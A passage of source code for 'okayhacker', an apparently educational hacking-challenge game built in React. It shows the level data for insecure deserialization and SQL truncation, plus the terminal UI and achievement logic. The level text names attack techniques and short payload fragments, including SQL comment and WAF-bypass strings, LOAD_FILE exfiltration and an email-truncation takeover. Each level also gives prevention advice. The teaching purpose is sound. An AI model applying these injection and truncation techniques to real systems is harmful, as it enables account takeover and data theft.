          'Insecure deserialization occurs when untrusted data is used to reconstruct objects. Attackers modify serialized objects to execute code, bypass authentication, or manipulate application logic. This vulnerability is particularly severe as it often leads to remote code execution.',
        technical:
          'Vulnerable formats: Java serialization, Python pickle, PHP serialize(), .NET BinaryFormatter, and YAML. Attack types: object injection, magic method abuse, gadget chains, and type confusion. Modern variants exploit JSON parsers, protocol buffers, and message queues.',
        when:
          'Found in: session cookies, API tokens, message queues, caching layers, web services, and RPC calls. Microservices communicating via serialized objects are particularly vulnerable.',
        example:
          'Java: Runtime.exec() via gadget chains. Python: pickle.__reduce__ for RCE. PHP: __wakeup() and __destruct() magic methods. Ruby: YAML.load() with !ruby/object. .NET: TypeNameHandling with malicious types.',
        impact:
          'Remote code execution, privilege escalation, authentication bypass, denial of service, and data tampering.',
        prevention:
          'Never deserialize untrusted data, use simple data formats (JSON), implement integrity checks (digital signatures), isolate deserialization, and monitor for deserialization attacks.',
      },
      learning:
        '💡 Never deserialize untrusted data! Use simple formats and validate everything.',
    },
    {
      id: 17,
      name: 'SQL Truncation',
      icon: <Database className="w-5 h-5" />,
      difficulty: 'Master',
      category: 'Injection',
      description: 'MySQL truncation attack',
      objective:
        'Bypass filter with comment: SET @@version_comment=#PWNED',
      hints: [
        'MySQL truncates data at certain limits',
        'Comments can hide malicious payloads',
        'Use # for MySQL comments after payload',
      ],
      instruction:
        "$ mysql> [INPUT]\n[!] MySQL Filter v5.7\nExecute query:",
      modalContent: {
        title: 'SQL Truncation & Advanced Injection Techniques',
        description:
          'SQL truncation attacks exploit database-specific behaviors where data is silently truncated at certain limits. Combined with other techniques like encoding, comments, and database-specific functions, these attacks bypass modern Web Application Firewalls (WAFs) and filtering mechanisms.',
        technical:
          'Techniques include: truncation attacks (exploiting varchar limits), scientific notation (1e1 = 10), alternative comment styles (–, #, /**/, /*!*/), stacked queries, heavy queries for time-based blind SQLi, and database-specific features. MySQL’s GROUP_CONCAT(), PostgreSQL’s string_agg(), and MSSQL’s xp_cmdshell offer unique attack vectors.',
        when:
          'Advanced SQL injection scenarios: bypassing WAFs, exploiting strict filters, second-order SQLi, stored procedure injection, and attacking hardened applications. Modern ORMs and prepared statements have reduced but not eliminated these vectors.',
        example:
          "Truncation: ‘admin@evil.com’ + spaces to push ‘@evil.com’ beyond field limit = ‘admin’ account takeover. WAF bypass: SeLeCt/**/FrOm. MySQL specific: /*!50000SELECT*/. Time-based: BENCHMARK(). DNS exfiltration: LOAD_FILE() with UNC paths.",
        impact:
          'Authentication bypass, data exfiltration, privilege escalation, and potential remote code execution through database-specific features.',
        prevention:
          'Use parameterized queries consistently, validate data length before database insertion, disable dangerous functions, implement proper logging and monitoring, and keep databases updated.',
      },
      learning:
        '💡 Validate input length and use parameterized queries! Know your database’s quirks.',
    },
  ];

  // Achievements definitions
  const achievements = [
    { id: 'first_hack', name: 'First Blood', description: 'Complete your first level', icon: '🩸', color: 'from-red-500 to-red-600' },
    { id: 'no_hints', name: 'Solo Hunter', description: 'Complete 3 levels without hints', icon: '🎯', color: 'from-green-500 to-green-600' },
    { id: 'speed_demon', name: 'Speed Demon', description: 'Complete a level in under 30 seconds', icon: '⚡', color: 'from-yellow-500 to-yellow-600' },
    { id: 'halfway', name: 'Rising Threat', description: 'Complete 9 levels', icon: '📈', color: 'from-blue-500 to-blue-600' },
    { id: 'perfect_run', name: 'Flawless', description: '5 levels without wrong answers', icon: '💎', color: 'from-purple-500 to-purple-600' },
    { id: 'master_hacker', name: 'Elite Hacker', description: 'Complete all 17 levels', icon: '👑', color: 'from-pink-500 to-cyan-500' },
  ];

  // Auto-scroll terminal
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [terminalOutput]);

  // Show level modal when starting or changing level
  useEffect(() => {
    if (gameStarted && currentLevel < levels.length && !gameCompleted) {
      setShowLevelModal(true);
      setLevelStartTime(Date.now());
    }
  }, [currentLevel, gameStarted]);

  // Typewriter effect for future use (not currently used in UI)
  const typewriterEffect = (text: string, callback?: () => void) => {
    setIsTyping(true);
    let index = 0;
    const timer = setInterval(() => {
      setTypingEffect(text.slice(0, index));
      index++;
      if (index > text.length) {
        clearInterval(timer);
        setIsTyping(false);
        callback && callback();
      }
    }, 30);
  };

  const addToTerminal = (message: string, type = 'user') => {
    const timestamp = new Date().toLocaleTimeString('en-US', {
      hour12: false,
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
    });
    setTerminalOutput((prev) => [...prev, { message, type, timestamp }]);
  };

  const startLevel = () => {
    setShowLevelModal(false);
    setTerminalOutput([]);
    const level = levels[currentLevel];
    addToTerminal(
      `┌─[okayhacker@localhost]─[~/challenges/level_${level.id.toString().padStart(2, '0')}]`,
      'prompt',
    );
    addToTerminal(`└──╼ cat README.md`, 'command');
    setTimeout(() => {
      addToTerminal(`# LEVEL ${level.id}: ${level.name.toUpperCase()}`, 'header');
      addToTerminal(`## Category: ${level.category}`, 'category');
      addToTerminal(`## Objective: ${level.objective}`, 'info');
      addToTerminal(``, 'empty');
      addToTerminal(level.instruction, 'system');
      addToTerminal(``, 'empty');
    }, 200);
  };

  const handleStartGame = () => {
    setGameStarted(true);
    setCurrentLevel(0);
    setScore(0);
    setTerminalOutput([]);
    setUnlockedAchievements([]);
  };

  const unlockAchievement = (achievementId: string) => {
    if (!unlockedAchievements.includes(achievementId)) {
      setUnlockedAchievements((prev) => [...prev, achievementId]);
      const achievement = achievements.find((a) => a.id === achievementId);
      if (achievement) {
        setTimeout(() => {
          addToTerminal(``, 'empty');
          addToTerminal(
            `🏆 ACHIEVEMENT UNLOCKED: ${achievement.name.toUpperCase()}`,
            'achievement',
          );
          addToTerminal(`   ${achievement.description}`, 'achievement-desc');
        }, 500);
      }
    }
  };

  const handleSubmit = () => {
    if (!userInput || levelCompleted) return;
    // Add to history
    if (userInput.trim()) {
      setTerminalHistory((prev) => [...prev, userInput]);
      setHistoryIndex(-1);
    }
    addToTerminal(
      `┌─[okayhacker@localhost]─[~/challenges/level_${levels[currentLevel].id
        .toString()
        .padStart(2, '0')}]`,
      'prompt',
    );
    addToTerminal(`└──╼ ${userInput}`, 'command');
    const level = levels[currentLevel];
    const solution = getSolution(level.id);
    if (userInput.trim() === solution) {
      const timeElapsed = levelStartTime ? Date.now() - levelStartTime : 0;
      const pointsEarned = Math.max(100 - hints * 25, 25);
      addToTerminal(``, 'empty');
      addToTerminal(`[+] ACCESS GRANTED - LEVEL ${level.id} COMPLETE`, 'success');
      addToTerminal(`[+] Points earned: ${pointsEarned}`, 'success');
      addToTerminal(`[+] Time: ${(timeElapsed / 1000).toFixed(1)}s`, 'success');
      setScore((prev) => prev + pointsEarned);
      setLevelCompleted(true);
      // Achievements
      if (currentLevel === 0) unlockAchievement('first_hack');
      if (hints === 0 && currentLevel >= 2) unlockAchievement('no_hints');
      if (timeElapsed < 30000) unlockAchievement('speed_demon');
      if (currentLevel === 8) unlockAchievement('halfway');
      addToTerminal(``, 'empty');
      addToTerminal(level.learning, 'learning');
      setTimeout(() => {
        if (currentLevel < levels.length - 1) {
          setCurrentLevel((prev) => prev + 1);
          setLevelCompleted(false);
          setHints(0);
          setShowHint(false);
        } else {
          setGameCompleted(true);
          unlockAchievement('master_hacker');
        }
      }, 3000);
    } else {
      addToTerminal(`[-] ACCESS DENIED: Invalid input`, 'error');
      const cmd = userInput.toLowerCase().trim();
      if (cmd === 'help') {
        addToTerminal(`Available commands:`, 'info');
        addToTerminal(`  hint     - Get a hint (-25 points)`, 'info');
        addToTerminal(`  clear    - Clear terminal output`, 'info');
        addToTerminal(`  restart  - Restart current level`, 'info');
        addToTerminal(`  info     - Show level information`, 'info');
      } else if (cmd === 'hint') {
        requestHint();
      } else if (cmd === 'clear') {
        setTerminalOutput([]);
      } else if (cmd === 'restart') {
        startLevel();
      } else if (cmd === 'info') {
        addToTerminal(`Level ${level.id}: ${level.name}`, 'info');
        addToTerminal(`Difficulty: ${level.difficulty}`, 'info');
        addToTerminal(`Category: ${level.category}`, 'info');
      }
    }
    setUserInput('');
  };

  const requestHint = () => {
    const level = levels[currentLevel];
    if (hints < level.hints.length) {
      addToTerminal(``, 'empty');
      addToTerminal(
        `💡 HINT ${hints + 1}/${level.hints.length}: ${level.hints[hints]}`,
        'warning',
      );
      setHints((prev) => prev + 1);
    } else {
      addToTerminal(`[!] No more hints available for this level`, 'error');
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      handleSubmit();
      return;
    }
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (terminalHistory.length > 0 && historyIndex < terminalHistory.length - 1) {
        const newIndex = historyIndex + 1;
        setHistoryIndex(newIndex);
        setUserInput(terminalHistory[terminalHistory.length - 1 - newIndex]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex > 0) {
        const newIndex = historyIndex - 1;
        setHistoryIndex(newIndex);
        setUserInput(terminalHistory[terminalHistory.length - 1 - newIndex]);
      } else if (historyIndex === 0) {
        setHistoryIndex(-1);
        setUserInput('');
      }
    }
  };

  const renderTerminal = () => (
    <div className="bg-gray-900 rounded-xl overflow-hidden shadow-2xl border border-gray-800 transition-all duration-300 hover:shadow-pink-500/10">
      {/* macOS Terminal Header */}
      <div className="bg-gradient-to-r from-gray-800 to-gray-850 px-4 py-3 flex items-center justify-between border-b border-gray-700">
        <div className="flex items-center space-x-2">
          <div className="flex items-center space-x-1.5">
            <div className="w-3 h-3 rounded-full bg-red-500 hover:bg-red-400 transition-colors cursor-pointer"></div>
            <div className="w-3 h-3 rounded-full bg-yellow-500 hover:bg-yellow-400 transition-colors cursor-pointer"></div>
            <div className="w-3 h-3 rounded-full bg-green-500 hover:bg-green-400 transition-colors cursor-pointer"></div>
          </div>
        </div>
        <div className="text-gray-400 text-xs font-medium flex items-center space-x-2">
          <Terminal className="w-3 h-3" />
          <span>okayhacker@localhost — bash — {terminalOutput.length} lines</span>
        </div>
        <div className="text-gray-500 text-xs bg-gray-700/50 px-2 py-1 rounded">
          Level {currentLevel + 1}/{levels.length}
        </div>
      </div>
      {/* Terminal Content */}
      <div
        ref={terminalRef}
        className="bg-black p-4 h-[400px] md:h-[450px] lg:h-[500px] overflow-y-auto font-mono text-xs md:text-sm custom-scrollbar"
      >
        {terminalOutput.map((output: any, index: number) => (
          <div
            key={index}
            className={`mb-1 ${
              output.type === 'success'
                ? 'text-green-400 font-semibold'
                : output.type === 'error'
                ? 'text-red-400'
                : output.type === 'warning'
                ? 'text-yellow-400'
                : output.type === 'info'
                ? 'text-cyan-400'
                : output.type === 'system'
                ? 'text-gray-400'
                : output.type === 'header'
                ? 'text-pink-400 font-bold text-base md:text-lg'
                : output.type === 'category'
                ? 'text-purple-400 text-xs'
                : output.type === 'prompt'
                ? 'text-green-400'
                : output.type === 'command'
                ? 'text-white'
                : output.type === 'learning'
                ? 'text-purple-400 italic'
                : output.type === 'achievement'
                ? 'text-yellow-300 font-bold animate-pulse'
                : output.type === 'achievement-desc'
                ? 'text-yellow-200 text-xs'
                : output.type === 'empty'
                ? ''
                : 'text-gray-300'
            } ${output.type === 'header' ? 'mt-2' : ''}`}
          >
            {output.type !== 'empty' && (
              <>
                {output.type === 'system' && (
                  <span className="text-gray-600 mr-2">[{output.timestamp}]</span>
                )}
                {output.message}
              </>
            )}
          </div>
        ))}
        <div className="h-4" />
      </div>
      {/* Input Area */}
      <div className="bg-gradient-to-r from-gray-900 to-gray-850 border-t border-gray-800 p-4">
        <div className="flex items-center space-x-2">
          <span className="text-green-400 text-xs md:text-sm font-semibold">┌─[okayhacker]─[$]</span>
        </div>
        <div className="mt-1 flex items-center space-x-2">
          <span className="text-green-400 text-xs md:text-sm font-semibold">└──╼</span>
          <input
            ref={inputRef}
            type={currentLevel === 1 && !showPassword ? 'password' : 'text'}
            value={userInput}
            onChange={(e) => setUserInput(e.target.value)}
            onKeyDown={handleKeyDown}
            disabled={levelCompleted || isTyping}
            className="flex-1 bg-transparent text-white font-mono text-xs md:text-sm focus:outline-none disabled:opacity-50 placeholder-gray-600"
            placeholder={levelCompleted ? 'Level completed! Proceeding...' : 'Enter command...'}
            autoFocus
            spellCheck={false}
            autoComplete="off"
            autoCorrect="off"
            autoCapitalize="off"
          />
          {currentLevel === 1 && (
            <button
              onClick={() => setShowPassword(!showPassword)}
              className="text-gray-500 hover:text-gray-300 transition-colors"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          )}
        </div>
      </div>
    </div>
  );

  // Enhanced Level Modal
  const LevelModal = () => {
    if (!showLevelModal) return null;
    const level = levels[currentLevel];
    return (
      <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-fadeIn">
        <div className="bg-gradient-to-br from-gray-900 via-gray-900 to-black rounded-2xl max-w-4xl w-full border border-pink-500/30 shadow-2xl shadow-pink-500/20 overflow-hidden">
          <div className="bg-gradient-to-r from-pink-500/10 to-cyan-500/10 p-6 md:p-8">
            <div className="flex flex-col md:flex-row items-start md:items-center justify-between mb-6">
              <div className="flex items-center space-x-4 mb-4 md:mb-0">
                <div className="p-3 bg-gradient-to-br from-pink-500/20 to-cyan-500/20 rounded-xl border border-pink-500/30">
                  {level.icon}
                </div>
                <div>
                  <h2 className="text-2xl md:text-3xl font-bold text-white">
                    Level {level.id}: {level.name}
                  </h2>
                  <div className="flex items-center space-x-2 mt-2">
                    <span
                      className={`text-xs px-3 py-1 rounded-full font-semibold ${
                        level.difficulty === 'Novice'
                          ? 'bg-green-500/20 text-green-400 border border-green-500/30'
                          : level.difficulty === 'Beginner'
                          ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30'
                          : level.difficulty === 'Intermediate'
                          ? 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30'
                          : level.difficulty === 'Advanced'
                          ? 'bg-orange-500/20 text-orange-400 border border-orange-500/30'
                          : level.difficulty === 'Expert'
                          ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                          : 'bg-purple-500/20 text-purple-400 border border-purple-500/30'
                      }`}
                    >
                      {level.difficulty}
                    </span>
                    <span className="text-xs px-3 py-1 rounded-full bg-gray-700/50 text-gray-300 border border-gray-600">
                      {level.category}
                    </span>
                  </div>
                </div>
              </div>
            </div>
            <div className="space-y-4 max-h-[60vh] overflow-y-auto custom-scrollbar pr-2">
              {/* Main Info Card */}
              <div className="bg-black/40 rounded-xl p-4 md:p-6 border border-gray-800">
                <h3 className="text-pink-400 font-bold mb-3 flex items-center text-lg">
                  <Info className="w-5 h-5 mr-2" />
                  {level.modalContent.title}
                </h3>
                <p className="text-gray-300 text-sm md:text-base leading-relaxed mb-4">
                  {level.modalContent.description}
                </p>
                {/* Technical Details */}
                <div className="bg-gray-900/50 rounded-lg p-4 mb-4 border border-gray-800">
                  <h4 className="text-cyan-400 text-xs font-bold uppercase mb-2">Technical Details</h4>
                  <p className="text-gray-400 text-xs md:text-sm leading-relaxed">
                    {level.modalContent.technical}
                  </p>
                </div>
                {/* When Used */}
                <div className="bg-pink-500/5 rounded-lg p-4 mb-4 border border-pink-500/20">
                  <h4 className="text-pink-400 text-xs font-bold uppercase mb-2">Attack Vectors</h4>
                  <p className="text-gray-300 text-xs md:text-sm leading-relaxed">
                    {level.modalContent.when}
                  </p>
                </div>
                {/* Example */}
                <div className="bg-black/60 rounded-lg p-4 mb-4 border border-cyan-500/20">
                  <h4 className="text-cyan-400 text-xs font-bold uppercase mb-2">Real-World Examples</h4>
                  <p className="text-gray-300 text-xs md:text-sm font-mono leading-relaxed break-all">
                    {level.modalContent.example}
                  </p>
                </div>
                {/* Impact & Prevention */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="bg-red-500/5 rounded-lg p-4 border border-red-500/20">
                    <h4 className="text-red-400 text-xs font-bold uppercase mb-2">Impact</h4>
                    <p className="text-gray-300 text-xs leading-relaxed">
                      {level.modalContent.impact}
                    </p>
                  </div>
                  <div className="bg-green-500/5 rounded-lg p-4 border border-green-500/20">
                    <h4 className="text-green-400 text-xs font-bold uppercase mb-2">Prevention</h4>
                    <p className="text-gray-300 text-xs leading-relaxed">
                      {level.modalContent.prevention}
                    </p>
                  </div>
                </div>
              </div>
              {/* Mission Objective */}
              <div className="bg-gradient-to-r from-pink-500/10 to-cyan-500/10 rounded-xl p-4 md:p-6 border border-pink-500/30">
                <h4 className="text-yellow-400 font-bold mb-2 text-lg">Your Mission</h4>
                <p className="text-white text-sm md:text-base">{level.objective}</p>
              </div>
            </div>
            <button
              onClick={startLevel}
              className="w-full mt-6 bg-gradient-to-r from-pink-500 to-pink-600 hover:from-pink-600 hover:to-pink-700 text-white font-bold py-4 rounded-xl transition-all transform hover:scale-[1.02] flex items-center justify-center space-x-2 shadow-lg shadow-pink-500/25"
            >
              <Terminal className="w-5 h-5" />
              <span className="text-lg">Initialize Attack Vector</span>
            </button>
          </div>
        </div>
      </div>
    );
  };

  // Landing Page (shown before the game starts)
  if (!gameStarted) {
    return (
      <div className="min-h-screen bg-black text-white overflow-hidden">
        <div className="relative min-h-screen flex items-center justify-center p-4 md:p-8">
          {/* Animated Background */}
          <div className="absolute inset-0">
            <div className="absolute inset-0 bg-gradient-to-br from-pink-500/5 via-black to-cyan-500/5"></div>
            <div className="absolute top-20 left-20 w-48 md:w-72 h-48 md:h-72 bg-pink-500/20 rounded-full blur-3xl animate-pulse"></div>
            <div className="absolute bottom-20 right-20 w-64 md:w-96 h-64 md:h-96 bg-cyan-500/20 rounded-full blur-3xl animate-pulse delay-1000"></div>
            <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-purple-500/10 rounded-full blur-3xl animate-pulse delay-500"></div>
          </div>
          <div className="relative max-w-6xl mx-auto text-center">
            <div className="mb-8 md:mb-12">
              <div className="flex justify-center mb-6 md:mb-8">
                <div className="relative">
                  <div className="absolute inset-0 bg-gradient-to-r from-pink-500 to-cyan-500 blur-3xl opacity-50 animate-pulse"></div>
                  <Layers className="w-20 h-20 md:w-32 md:h-32 text-pink-500 relative animate-float" />
                </div>
              </div>
              <h1 className="text-5xl md:text-7xl lg:text-8xl font-bold mb-2 md:mb-4">
                <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-500 bg-clip-text text-transparent animate-gradient">
                  okayhacker
                </span>
              </h1>
              <p className="text-xl md:text-3xl text-gray-400 mb-2">let's play</p>
              <p className="text-sm md:text-lg text-gray-500">Master 17 Real-World Cybersecurity Challenges</p>
              <div className="mt-8 md:mt-12 grid grid-cols-1 md:grid-cols-3 gap-4 md:gap-6 max-w-4xl mx-auto">
                <div className="bg-gradient-to-br from-gray-900/80 to-black backdrop-blur border border-pink-500/20 rounded-xl p-6 transform hover:scale-105 transition-all">
                  <Shield className="w-8 h-8 text-pink-500 mb-3 mx-auto" />
                  <h3 className="text-lg font-bold mb-2 bg-gradient-to-r from-pink-400 to-pink-600 bg-clip-text text-transparent">
                    OWASP Top 10
                  </h3>
                  <p className="text-xs md:text-sm text-gray-400">Real vulnerabilities from production systems</p>
                </div>
                <div className="bg-gradient-to-br from-gray-900/80 to-black backdrop-blur border border-cyan-500/20 rounded-xl p-6 transform hover:scale-105 transition-all">
                  <Terminal className="w-8 h-8 text-cyan-500 mb-3 mx-auto" />
                  <h3 className="text-lg font-bold mb-2 bg-gradient-to-r from-cyan-400 to-cyan-600 bg-clip-text text-transparent">
                    macOS Terminal
                  </h3>
                  <p className="text-xs md:text-sm text-gray-400">Authentic command-line hacking experience</p>
                </div>
                <div className="bg-gradient-to-br from-gray-900/80 to-black backdrop-blur border border-purple-500/20 rounded-xl p-6 transform hover:scale-105 transition-all">
                  <Award className="w-8 h-8 text-purple-500 mb-3 mx-auto" />
                  <h3 className="text-lg font-bold mb-2 bg-gradient-to-r from-purple-400 to-purple-600 bg-clip-text text-transparent">
                    Learn & Earn
                  </h3>
                  <p className="text-xs md:text-sm text-gray-400">Detailed explanations and achievement system</p>
                </div>
              </div>
              <button
                onClick={handleStartGame}
                className="mt-8 md:mt-12 bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-500 hover:from-pink-600 hover:via-purple-600 hover:to-cyan-600 text-white font-bold py-4 px-8 md:px-12 rounded-xl text-lg md:text-xl transition-all transform hover:scale-105 shadow-2xl shadow-pink-500/25 animate-glow"
              >
                <Fingerprint className="inline w-6 h-6 mr-2" />
                Initialize System
              </button>
              <p className="mt-6 md:mt-8 text-xs text-gray-600">
                For educational purposes only. Practice responsible disclosure.
              </p>
            </div>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-8 md:mt-12 max-w-2xl mx-auto">
              <div className="text-center">
                <p className="text-2xl md:text-3xl font-bold text-pink-500">17</p>
                <p className="text-xs text-gray-500">Challenges</p>
              </div>
              <div className="text-center">
                <p className="text-2xl md:text-3xl font-bold text-cyan-500">6</p>
                <p className="text-xs text-gray-500">Achievements</p>
              </div>
              <div className="text-center">
                <p className="text-2x md:text-3x font-bold text-purple-500">
                  1700
                </p>
                <p className="text-xs text-gray-500">Max Score</p>
              </div>
              <div className="text-center">
                <p className="text-2xl md:text-3xl font-bold text-yellow-500">∞</p>
                <p className="text-xs text-gray-500">Replayability</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Completion Screen (shown after all levels completed)
  if (gameCompleted) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center p-4 md:p-8">
        <div className="relative">
          <div className="absolute inset-0 bg-gradient-to-br from-pink-500/20 to-cyan-500/20 blur-3xl animate-pulse"></div>
          <div className="relative max-w-5xl mx-auto text-center">
            <CheckCircle className="w-24 h-24 md:w-32 md:h-32 text-green-400 mx-auto mb-6 md:mb-8 animate-bounce" />
            <h1 className="text-4xl md:text-6xl lg:text-7xl font-bold mb-4 bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-500 bg-clip-text text-transparent">
              Elite Status Achieved
            </h1>
            <p className="text-xl md:text-2xl text-gray-400 mb-6 md:mb-8">
              You’ve mastered all 17 challenges
            </p>
            <div className="bg-gray-900/80 backdrop-blur rounded-lg p-8 mb-8 border border-pink-500/20">
              <h2 className="text-3xl font-bold mb-6">
                Final Score:{' '}
                <span className="text-pink-500">{score}</span>
              </h2>
              <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                {achievements.map((achievement) => (
                  <div
                    key={achievement.id}
                    className={`p-4 rounded-lg border ${
                      unlockedAchievements.includes(achievement.id)
                        ? `bg-gradient-to-br ${achievement.color} border-pink-500/30`
                        : 'bg-gray-800/50 border-gray-700 opacity-50'
                    }`}
                  >
                    <div className="text-3xl mb-2">{achievement.icon}</div>
                    <p className="font-bold text-sm">{achievement.name}</p>
                    <p className="text-xs text-gray-400 mt-1">
                      {achievement.description}
                    </p>
                  </div>
                ))}
              </div>
            </div>
            <button
              onClick={() => {
                setGameStarted(false);
                setCurrentLevel(0);
                setScore(0);
                setGameCompleted(false);
                setUnlockedAchievements([]);
                setTerminalOutput([]);
                setTerminalHistory([]);
              }}
              className="bg-gradient-to-r from-pink-500 to-cyan-500 hover:from-pink-600 hover:to-cyan-600 text-white font-bold py-3 px-8 rounded-lg transition-all transform hover:scale-105"
            >
              Hack Again
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Main Game UI (shown while playing)
  return (
    <div className="min-h-screen bg-black text-white">
      <div className="max-w-7xl mx-auto p-4">
        {/* Header */}
        <div className="flex justify-between items-center mb-6 bg-gray-900/50 backdrop-blur rounded-lg p-4 border border-gray-800">
          <div className="flex items-center space-x-4">
            <Layers className="w-8 h-8 text-pink-500" />
            <div>
              <h1 className="text-2xl font-bold">okayhacker</h1>
              <p className="text-xs text-gray-500">Ethical Hacking Simulator</p>
            </div>
          </div>
          <div className="flex items-center space-x-6">
            <div className="text-right">
              <p className="text-xs text-gray-500 uppercase">Score</p>
              <p className="text-xl font-bold text-pink-500">{score}</p>
            </div>
            <div className="text-right">
              <p className="text-xs text-gray-500 uppercase">Progress</p>
              <p className="text-xl font-bold text-cyan-500">{currentLevel + 1}/{levels.length}</p>
            </div>
          </div>
        </div>
        <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
          {/* Sidebar */}
          <div className="lg:col-span-1 space-y-4">
            {/* Current Level */}
            <div className="bg-gray-900/80 backdrop-blur rounded-lg p-4 border border-pink-500/20">
              <h3 className="text-sm font-semibold text-pink-400 mb-3 uppercase">Current Challenge</h3>
              <div className="space-y-3">
                <div className="flex items-center space-x-3">
                  {levels[currentLevel].icon}
                  <div>
                    <p className="font-semibold">{levels[currentLevel].name}</p>
                    <p className="text-xs text-gray-500">{levels[currentLevel].description}</p>
                  </div>
                </div>
                <button
                  onClick={requestHint}
                  disabled={levelCompleted || hints >= 3}
                  className="w-full bg-gray-800 hover:bg-gray-700 disabled:bg-gray-900 disabled:cursor-not-allowed text-white text-sm font-medium py-2 px-4 rounded transition-colors border border-gray-700"
                >
                  <Key className="w-4 h-4 inline mr-2" />
                  Hint ({3 - hints}/3) [-25 pts]
                </button>
              </div>
            </div>
            {/* Level Progress */}
            <div className="bg-gray-900/80 backdrop-blur rounded-lg p-4 border border-cyan-500/20">
              <h3 className="text-sm font-semibold text-cyan-400 mb-3 uppercase">All Levels</h3>
              <div className="space-y-1 max-h-64 overflow-y-auto custom-scrollbar">
                {levels.map((level, index) => (
                  <div
                    key={level.id}
                    className={`flex items-center space-x-2 p-2 rounded text-xs ${
                      index === currentLevel
                        ? 'bg-pink-500/20 border border-pink-500/30'
                        : index < currentLevel
                        ? 'bg-green-900/20'
                        : 'opacity-50'
                    }`}
                  >
                    <div className="w-5 h-5">
                      {index < currentLevel ? (
                        <CheckCircle className="w-5 h-5 text-green-400" />
                      ) : index === currentLevel ? (
                        <ChevronRight className="w-5 h-5 text-pink-500 animate-pulse" />
                      ) : (
                        <Lock className="w-5 h-5 text-gray-600" />
                      )}
                    </div>
                    <span className={index <= currentLevel ? 'text-white' : 'text-gray-600'}>
                      {level.id}. {level.name}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>
          {/* Main Terminal */}
          <div className="lg:col-span-3">
            {renderTerminal()}
            {/* Quick Commands */}
            <div className="mt-4 flex items-center space-x-4 text-xs text-gray-500">
              <span>Quick Commands:</span>
              <button onClick={() => setUserInput('help')} className="text-cyan-400 hover:text-cyan-300">
                help
              </button>
              <span>•</span>
              <button onClick={() => setUserInput('hint')} className="text-pink-400 hover:text-pink-300">
                hint
              </button>
              <span>•</span>
              <button onClick={() => setUserInput('clear')} className="text-gray-400 hover:text-gray-300">
                clear
              </button>
              <span>•</span>
              <button onClick={() => setUserInput('info')} className="text-purple-400 hover:text-purple-300">
                info
              </button>
              <span className="text-gray-600">↑↓ for history</span>
            </div>
          </div>
        </div>
        {/* Achievements Bar */}
        {unlockedAchievements.length > 0 && (
          <div className="mt-6 bg-gray-900/50 backdrop-blur rounded-lg p-4 border border-purple-500/20">
            <h3 className="text-sm font-semibold text-purple-400 mb-3 uppercase">Achievements</h3>
            <div className="flex flex-wrap gap-2">
              {achievements
                .filter((a) => unlockedAchievements.includes(a.id))
                .map((achievement) => (
                  <div
                    key={achievement.id}
                    className="bg-gradient-to-r from-purple-500/20 to-pink-500/20 px-3 py-2 rounded-lg flex items-center space-x-2 border border-purple-500/30"
                  >
                    <span className="text-xl">{achievement.icon}</span>
                    <span className="text-xs font-semibold">{achievement.name}</span>
                  </div>
                ))}
            </div>
          </div>
        )}
      </div>
      {/* Level Modal */}
      <LevelModal />
      <style jsx>{`
        .custom-scrollbar::-webkit-scrollbar {
          width: 8px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: rgba(31, 41, 55, 0.5);
          border-radius: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: rgba(236, 72, 153, 0.3);
          border-radius: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: rgba(236, 72, 153, 0.5);
        }
        .animate-pulse {
          animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }
        .delay-1000 {
          animation-delay: 1000ms;
        }
        @keyframes pulse {
          0%, 100% {
            opacity: 1;
          }
          50% {
            opacity: 0.5;
          }
        }
      `}</style>
    </div>
  );
};

export default function Page() {
  return <OkayHackerGame />;
}
